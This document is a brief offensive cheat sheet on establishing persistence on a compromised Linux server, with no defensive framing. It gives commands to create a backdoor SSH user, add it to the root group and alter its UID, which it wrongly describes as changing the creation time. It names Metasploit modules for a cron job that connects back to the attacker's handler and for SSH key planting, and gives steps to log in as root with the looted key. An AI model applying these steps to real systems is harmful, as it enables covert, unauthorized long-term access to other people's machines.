# Establishing Persistence on Linux

**Creating backdoor user**  
This will only work if the target server is running SSH  
1. Open Shell
2. ```/bin/bash -i```
3. ```useradd -m (name) -s /bin/bash```
4. ```passwd (name)```

**Add user to root group**  
```usermod -aG root (name)```

**Update when the username was created**  
usermod -u 15 (name)

### Modules
1. **exploit/linux/local/cron_persistence** - sets up cron job that connects to your handler  
2. **exploit/linux/local/service_persistence** - Creates vulnerable services for exploiting
3. **post/linux/manage/sshkey_persistence** - sets up a private and public ssh key pair and will add it to home directory of all accounts
- set CREATESSHFOLDER true
- This will give you the ssh key in the loot command
1. copy contents
2. exit of out MSF console
3. create file called ssh_key
4. chmod 0400 ssh_key
5. ssh -i ssh_key root@(target IP address)
